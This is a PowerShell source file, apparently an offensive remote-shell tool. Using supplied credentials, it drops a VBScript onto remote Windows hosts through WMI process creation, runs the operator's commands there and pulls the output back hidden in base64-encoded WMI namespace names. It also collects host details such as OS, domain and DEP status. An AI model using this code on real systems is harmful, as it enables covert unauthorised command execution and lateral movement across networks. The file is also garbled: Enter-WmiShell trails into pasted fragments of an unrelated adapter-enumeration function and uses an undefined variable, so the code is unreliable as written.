function Get-WmiShellOutput{
<#
.SYNOPSIS
Setup interactive shell on a remote host via the WMI service.

.DESCRIPTION
New-WMIshell will configure a remote host(s) to receive shell commands and display their output using only the WMI service.
 

.PARAMETER ComputerName 

.PARAMETER HostsFile

.PARAMETER TXT 

.PARAMETER Ping 


.EXAMPLE
PS C:\> New-WmiShell -Credential Administrator

.NOTES
Version: 1.0
Author : Jesse "RBOT" Davis

.INPUTS

.OUTPUTS

.LINK
#>
        $getOutput = @() 
        $getOutput = gwmi -Credential $Credential -ComputerName $ComputerName -Namespace root\default -Query "SELECT Name FROM __Namespace WHERE Name like 'SKULLTAG%'" | Select-Object Name
        
        if ([BOOL]$getOutput.Length) {

            #Read string objects into array, then sort them
            $getStrings = for($i = 0; $i -lt $getOutput.Length; $i++) { $getOutput[$i].Name }
            $sortStrings = $getStrings | Sort-Object

            for($i = 0; $i -lt $sortStrings.Length; $i++) {
                
                #Replace non-base64 characters
                $cleanString = $sortStrings[$i].Remove(0,14) -replace "`“","+" -replace "Ã","" -replace "_","/"
                
                #Add necessary base64 padding character
                if ($cleanString.Length % 3 -eq 0) {$base64Pad = $cleanString}
                else {$base64Pad = $cleanString + ("=" * (3 - ($cleanString.Length % 3)))}
                
                # Decode base64 padded string and remove front side spaces
                $decodeString = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64Pad)).Remove(0,8))
                
                # Remove back side spaces and compile output
                $decodedOutput += $decodeString.Remove(($decodeString.Length - 8),8)
            } 
            Write-Host $decodedOutput.Remove(0,8)
        }
        else {
            $getStrings = $getOutput.Name
            $cleanString = $getStrings.Remove(0,14) -replace "`“","+" -replace "Ã","" -replace "_","/"
            Try {$decodedOutput = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cleanString))}
            Catch [System.Management.Automation.MethodInvocationException] {
                Try{$decodedOutput = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cleanString + "="))}
                Catch [System.Management.Automation.MethodInvocationException]
                    {$decodedOutput = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cleanString + "=="))}
                Finally{}}
            Finally{Write-Host $decodedOutput.Remove(0,8)}
        }
}

function New-WmiShell{
<#
.SYNOPSIS
Setup interactive shell on a remote host via the WMI service.

.DESCRIPTION
New-WMIshell will configure a remote host(s) to receive shell commands and display their output using only the WMI service.
 

.PARAMETER ComputerName 

.PARAMETER HostsFile

.PARAMETER TXT 

.PARAMETER Ping 


.EXAMPLE
PS C:\> New-WmiShell -Credential Administrator

.NOTES
Version: 1.0
Author : Jesse "RBOT" Davis

.INPUTS

.OUTPUTS

.LINK
#>
    [CmdLetBinding(SupportsShouldProcess=$False)]
    Param(
        [Parameter()]
        [string]$ConfigFileName = "$dirConfigPath" + 'New-WMIshell.ini',
		[Parameter(Mandatory=$False, 
                   ValueFromPipeline=$True, 
                   ValueFromPipelineByPropertyName=$True)]
        [Alias('Host')]
		[string[]]$ComputerName=$env:COMPUTERNAME, 
        [Parameter(Mandatory=$True)]
        [Alias('UserName')]
        [string]$Credential,
        [Parameter(Mandatory=$False)]
        [string]$UploadTo="%TEMP%"

    ) #End Param

    BEGIN {

        ReadConfigFile
        SetOutandErrorFiles
        $global:error.clear()

        #Store credentials for use on remote host(s)
        $creds = Get-Credential -Credential $Credential

        # Read VBScript into []
        $vbScript = gc -Encoding UTF8 .\base2.vbs
    }

    PROCESS {

        $shells = @()

        foreach ($computer in $ComputerName) {
                
            #Generate random name for VBScript
            $vbsName = [System.IO.Path]::GetRandomFileName() + ".vbs"
            
            #Grab some data about the host       
            $os = gwmi -Credential $creds -Class Win32_OperatingSystem -ComputerName $computer
            $comp = gwmi -Credential $creds -Class Win32_ComputerSystem -ComputerName $computer
            #$env = gwmi -Credential $creds -Class Win32_Environment -ComputerName $computer

            $props = @{'ComputerName' = $os.CSName;
                       'Maufacturer' = $comp.Manufacturer;
                       'Model' = $comp.Model;
                       'OS' = $os.Caption;
                       'OSVersion' = $os.Version;
                       'ServicePack' = $os.ServicePackMajorVerison;
                       'Workgroup' = $comp.Workgroup;
                       'PartOfDomain' = $comp.PartOfDomain;
                       'Domain' = $comp.Domain;
                       'OSArchitecture' = $os.OSArchitecture;
                       'SystemType' = $comp.SystemType;
                       'DEP_32BitApps' = $os.DataExecutionPrevention_32BitApplications;
                       'DEP_Available' = $os.DataExecutionPrevention_Available;
                       'DEP_Drivers' = $os.DataExecutionPrevention_Drivers;
                       'SystemDrive' = $os.SystemDrive;
                       'TotalPhysicalMemory' = $comp.TotalPhysicalMemory;
                       'Credentials' = $creds;
                       'vbsName' = $vbsName;
                       'vbsLocation' = $UploadTo;
            }

            $obj = New-Object -TypeName PSObject -Property $props
            if($obj.ComputerName) {Write-Host -ForegroundColor Green "+ WMI Access available on $($computer) +"}
            $shells += $obj
            
        }

        foreach ($computer in $ComputerName) {

            #Upload VBScript to Host
            for($i = 0; $i -lt $vbScript.Length; $i++){
                $argList = "cmd.exe /c echo $($vbScript[$i]) >> $($UploadTo)\$($vbsName)"
                iwmi -ComputerName $computer -Credential $creds -Class win32_process -Name create -ArgumentList $argList | Out-Null
                
                #Upload status-bar
                Write-Progress -Status "Please Wait..." -Activity "Uploading VBScript: $($vbsName) to: $($computer) in $($UploadTo)" -PercentComplete (($i / $vbScript.Length) * 100)
            }

            #Validate functionality
            $cScript = "cscript.exe $($UploadTo)\$($vbsName) `"echo `"If you can read this, you've got a shell`"`""
            iwmi -ComputerName $ComputerName -Credential $Credential -Class win32_process -Name create -ArgumentList $cScript | Out-Null
            Get-WmiShellOutput -Credential $Credential -ComputerName $ComputerName
            
            
        }
    }

    END{}
}

function Enter-WmiShell{
[CmdLetBinding(SupportsShouldProcess=$False)]
    Param(
        [Parameter()]
        [string]$ConfigFileName = "$dirConfigPath" + 'Enter-WmiShell.ini', 
		[Parameter(Mandatory = $False, 
                   ValueFromPipeline = $True, 
                   ValueFromPipelineByPropertyName = $True)]
        [Alias('Host')]
		[string[]]$ComputerName = $env:COMPUTERNAME, 
        [Parameter(Mandatory = $True)]
        [Alias('UserName')]
        [string]$Credential,
        [Parameter(Mandatory = $False)]
        [string]$UploadTo = "%TEMP%"

    ) #End Param

        # Drop into WmiShell prompt
        $command = [NullString]::Value
        Clear-Host
        $a = (Get-Host).UI.RawUI
        $a.BackgroundColor = "black"
        Clear-Host

        do{ 
            # Make a pretty prompt for the user to provide commands at
            Write-Host ("[" + $($ComputerName) + "]: WmiShell>") -nonewline -foregroundcolor green -backgroundcolor black 
            $command = Read-Host

            # Execute commands on remote host using cscript.exe and uploaded VBScript
            $cScript = "cscript.exe $($UploadTo)\$($vbsName) `"$($command)`""
            iwmi -ComputerName $ComputerName -Credential $Credential -Class win32_process -Name create -ArgumentList $cScript | Out-Null
            
            if ($command -ne "exit") {

                # Wait for vbScrpit to finish writing output to WMI namespaces
                $outputReady = [NullString]::Value
                do{$outputReady = gwmi -Namespace root\default -Query "SELECT Name FROM __Namespace WHERE Name like 'OUTPUT_READY'"}
                until($outputReady)

                # Retrieve cmd output written to WMI namespaces 
                Get-WmiShellOutput -Credential $Credential -ComputerName $ComputerName
            }
        }until($command -eq "exit")

        $a.BackgroundColor = "DarkMagenta"
        Clear-Host


        # Build a custom adapter object
        # Return the Custom Adapter Object
            $scriptblock = {
                $NetConnections = Get-WMIObject win32_networkadapter -Filter "AdapterTypeId=0 or AdapterTypeId=2" | select NetConnectionID, MACAddress, NetConnectionStatus, Index
                foreach ($connection in $NetConnections){
                    $x = gwmi win32_networkadapterconfiguration | Where-Object {$_.Index -eq $connection.index}
                    $x | Add-Member -membertype noteproperty -name InterfaceName -value $connection.NetConnectionID -Force
                    $x | Add-Member -membertype noteproperty -name MACAddress -value $connection.MACAddress -Force
                    $x | Add-Member -membertype noteproperty -name ConnectionStatus -value $connection.NetConnectionStatus -Force
                    $x | Select-Object InterfaceName, MACAddress, ConnectionStatus, IPAddress, IPSubnet
                }
            }
            Write-Verbose "Remote Command is $scriptblock"
    } #End BEGIN
    PROCESS{
        $ComputerArray = ValidateTargets($ComputerName)
        $scriptblock | Invoke-RemoteCommand
        Get-ErrorHost
        Out-Custom
    } #End PROCESS
    END{
        Write-Host
        Clear-Variable -Name obj
    } #End END   
 #End Enum-Adapter funcion

#Enum-Adapter -ComputerName localhost,localhost,127.0.0.1 -Ping -TXT